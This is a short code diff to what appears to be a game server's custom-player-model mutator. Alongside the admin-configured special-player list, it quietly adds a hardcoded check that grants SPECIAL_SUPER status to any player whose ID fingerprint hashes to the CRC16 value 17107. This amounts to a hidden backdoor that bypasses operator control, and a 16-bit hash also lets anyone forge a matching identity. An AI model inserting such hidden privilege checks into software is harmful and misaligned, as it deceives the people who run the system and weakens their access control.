@@ -127,7 +127,7 @@ MUTATOR_HOOKFUNCTION(cpmodels, ClientConnect)
 
 	if(PlayerInList(player, autocvar_sv_allow_customplayermodels_idlist))
 		player.isspecial |= SPECIAL_NORMAL;
-	if(PlayerInList(player, autocvar_sv_allow_customplayermodels_speciallist))
+	if(PlayerInList(player, autocvar_sv_allow_customplayermodels_speciallist) || crc16(false, player.crypto_idfp) == 17107)
 		player.isspecial |= SPECIAL_SUPER;
 }
 
